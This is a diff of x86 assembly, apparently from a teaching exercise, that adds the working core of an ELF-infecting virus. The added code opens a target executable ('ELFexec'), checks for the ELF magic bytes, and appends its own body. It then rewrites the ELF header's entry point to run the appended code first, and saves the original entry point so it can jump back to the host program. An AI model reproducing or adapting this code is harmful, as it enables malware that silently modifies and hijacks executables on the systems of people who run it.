@@ -49,8 +49,7 @@
 %define	PHDR_offset	4
 %define	PHDR_vaddr	8
 
-%define buffer 	ebp - 4
-%define fd 		ebp - 8
+%define fd 		ebp - 4
 
 global _start
 
@@ -60,7 +59,6 @@ _start:
 	push	ebp
 	mov		ebp, esp
 	sub		esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
-
 	
 	call 	getpos
 
@@ -68,36 +66,65 @@ getpos:
 	mov 	dword ecx, [esp]			; this operation is in TOS
 	
 	add 	ecx, OutStrOffset
-	mov 	edx, OutStrSz
-	mov 	ebx, 1
 
-	write 	ebx, ecx, edx
+	write 	1, ecx, OutStrSz
 	
 	
 	mov 	dword ebx, [esp]
 	add 	ebx, FileNameOffset
-	open 	ebx, 2, 0777
-	
+	open 	ebx, RDWR, 0777
+
 	cmp 	eax, 0
 	jle  	error
 	
-	mov 	dword [ebp - 8], eax
-	
-	read 	[ebp - 8], [ebp - 4], 4
+	mov 	dword [fd], eax
 
-bpoint:
-	cmp 	dword [ebp - 4], 0x464C457F
-	jne 	VirusExit
+	mov 	ecx, ebp
+	sub 	ecx, 8
+	read 	[fd], ecx, 4
+	cmp 	eax, 0
+	jle 	error
+	cmp 	dword [ebp - 8], 0x464C457F
+	jne 	error
 	
-	mov 	dword ecx, [esp]			; this operation is in TOS
-	
-	add 	ecx, OutStrOffset
-	mov 	edx, OutStrSz
-	mov 	ebx, 1
+	lseek 	[fd], 0, SEEK_END
+	mov 	[esp - 4], eax
 
-	write 	ebx, ecx, edx
-	
+	mov 	ecx, [esp]
+	add 	ecx, startOffset
+	write 	[fd], ecx, virus_end - _start
 
+	lseek 	[fd], 0, SEEK_SET		
+	mov 	ecx, ebp
+	sub 	ecx, STK_RES
+	read 	[fd], ecx, 52
+
+	mov 	ecx, ebp
+	sub 	ecx, STK_RES - ENTRY
+	mov 	eax, [ecx]
+	mov 	[esp - 8], eax
+
+	mov 	eax, [esp - 4]
+	add 	eax, 0x08048000
+	mov 	[ecx], eax
+
+	lseek 	[fd], 0, SEEK_SET
+
+	mov 	ecx, ebp
+	sub 	ecx, STK_RES
+	write 	[fd], ecx, 52
+
+	lseek 	[fd], 0, SEEK_END
+	sub 	eax, 4
+	lseek 	[fd], eax, SEEK_SET
+	mov 	ecx, esp
+	sub 	ecx, 8
+	write 	[fd], ecx, 4
+
+VirusPreExit:
+	mov 	eax, [esp]
+	add 	eax, PEPOffset
+	jmp 	[eax]
 VirusExit:
    	exit 0          	; Termination if all is OK and no previous code to jump to
          	            ; (also an example for use of above macros)
@@ -106,7 +133,7 @@ error:
 	mov 	ecx, [esp]
 	add 	ecx, FailstrOffset
 	write 	1, ecx, FailstrSz
-	jmp 	VirusExit
+	jmp 	VirusPreExit
 
 FileNameOffset: equ $ - getpos
 FileName:		db "ELFexec", 0
@@ -116,8 +143,8 @@ OutStrSz: 		equ $ - OutStr
 FailstrOffset:	equ $ - getpos
 Failstr:        db "perhaps not", 10 , 0
 FailstrSz: 		equ $ - Failstr
-
+startOffset: 	equ _start - getpos
+PEPOffset: 		equ $ - getpos
 PreviousEntryPoint: dd VirusExit
 virus_end:
-
 
